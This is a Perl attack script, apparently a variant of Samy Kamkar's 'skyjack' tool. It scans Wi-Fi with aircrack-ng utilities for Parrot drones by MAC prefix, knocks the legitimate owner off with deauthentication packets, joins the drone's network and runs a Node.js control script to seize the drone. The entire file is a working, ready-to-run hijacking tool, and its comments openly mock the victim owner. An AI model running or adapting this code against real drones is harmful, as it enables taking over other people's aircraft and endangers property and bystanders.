#!/usr/bin/perl

# skyjack, by samy kamkar

# this software detects flying drones, deauthenticates the
# owner of the targetted drone, then takes control of the drone

# by samy kamkar, code@samy.pl
# http://samy.pl
# dec 2, 2013


# mac addresses of ANY type of drone we want to attack
# Parrot owns the 90:03:B7 block of MACs and a few others
# see here: http://standards.ieee.org/develop/regauth/oui/oui.txt

my @drone_macs = qw/90:03:B7 A0:14:3D 00:12:1C 00:26:7E/;


use strict;

my $droneToHack = shift || die "NO MAC PROVIDED $!";
my $interface  = shift || "wlan1";
my $interface2 = shift || "wlan0";

chomp $droneToHack;

# the JS to control our drone
my $controljs  = shift || "drone_control/drone_pwn.js";

my $land = "/home/ivankon/SENTINOWL/skyjack/land.py";

# paths to applications
my $dhclient	= "dhclient";
my $iwconfig	= "iwconfig";
my $ifconfig	= "ifconfig";
my $airmon	= "airmon-ng";
my $aireplay	= "aireplay-ng";
my $aircrack	= "aircrack-ng";
my $airodump	= "airodump-ng";
my $nodejs	= "nodejs";

print "DRONE TO HACK: $droneToHack\n";
# put device into monitor mode
sudo($ifconfig, $interface, "down");

# tmpfile for ap output
my $tmpfile = "/tmp/dronestrike";
my %skyjacked;

use threads ('yield',
			 'stack_size' => 64*4096,
			 'exit' => 'threads_only',
			 'stringify');
sub start_thread {
	my @args = @_;
	print('Thread started: ', join(' ', @args), "\n");
}

while (1)
{

		# show user APs
		eval {
			local $SIG{INT} = sub { die };
			my $pid = open(DUMP, "|sudo $airodump --output-format csv -w $tmpfile $interface >>/dev/null 2>>/dev/null") || die "Can't run airodump ($airodump): $!";
			print "pid $pid\n";
			sleep(10);
			# wait 5 seconds then kill
			sleep 2;
			print DUMP "\cC";
			sleep 1;
			sudo("kill", $pid);
			sleep 1;
			sudo("kill", "-HUP", $pid);
			sleep 1;
			sudo("kill", "-9", $pid);
			sleep 1;
			sudo("killall", "-9", $aireplay, $airodump);

			close(DUMP);
		};

		sleep 4;
		# read in APs
		my %clients;
		my %chans;
		foreach my $tmpfile1 (glob("$tmpfile*.csv"))
		{

				open(APS, "<$tmpfile1") || print "Can't read tmp file $tmpfile1: $!";
				while (<APS>)
				{
					# strip weird chars
					s/[\0\r]//g;

					foreach my $dev (@drone_macs)
					{	
						print $dev;
						# determine the channel
						if (/^($dev:[\w:]+),\s+\S+\s+\S+\s+\S+\s+\S+\s+(\d+),.*(ardrone\S+),/)
						{
							my $v1 = $1;
							my $v2 = $2;
							my $v3 = $3;	
							if($v1=~/$droneToHack/i){
								print "CHANNEL $v1 $v2 $v3\n";
								$chans{$v1} = [$v2, $v3];
							}
						}

						# grab our drone MAC and owner MAC
						if (/^([\w:]+).*\s($dev:[\w:]+),/)
						{
							my $v1 = $1;
							my $v2 = $2;
							if($v2=~/$droneToHack/i){
								print "CLIENT $v1 $v2\n";
								$clients{$v1} = $v2;
							}
						}
					}
				}
				close(APS);
				sudo("rm", $tmpfile1);
				
		}
		print "\n\n";

		foreach my $cli (keys %clients)
		{
			print "Found client ($cli) connected to $chans{$clients{$cli}}[1] ($clients{$cli}, channel $chans{$clients{$cli}}[0])\n";


			# hop onto the channel of the ap
			print "Jumping onto drone's channel $chans{$clients{$cli}}[0]\n\n";
			sudo($iwconfig, $interface, "channel", $chans{$clients{$cli}}[0]);

			sleep(1);

			# now, disconnect the TRUE owner of the drone.
			# sucker.
			print "Disconnecting the true owner of the drone ;)\n\n";
			sudo($aireplay, "-0", "10", "-a", $clients{$cli}, "-c", $cli, $interface);

		}

		sleep(2);

		# connect to each drone and run our zombie client!
		foreach my $drone (keys %chans)
		{
			# ignore drones we've skyjacked before -- thanks to @daviottenheimer for bug discovery!
			next if $skyjacked{$chans{$drone}[1]}++;

			print "\n\nConnecting to drone $chans{$drone}[1] ($drone)\n";
			sudo($ifconfig, $interface2, "down");
			sudo($iwconfig, $interface2, "essid", $chans{$drone}[1]);
			sudo($ifconfig, $interface2, "up");

			print "Acquiring IP from drone for hostile takeover\n";
			sudo($dhclient, "-v", $interface2);

			print "\n\nTAKING OVER DRONE\n";
			sudo($nodejs, $controljs);

			sleep(15);
			exit 0;
		}

	sleep 5;
	exit 0;
}


sub sudo
{
	print "Running: @_\n";
	system("sudo", @_);
}
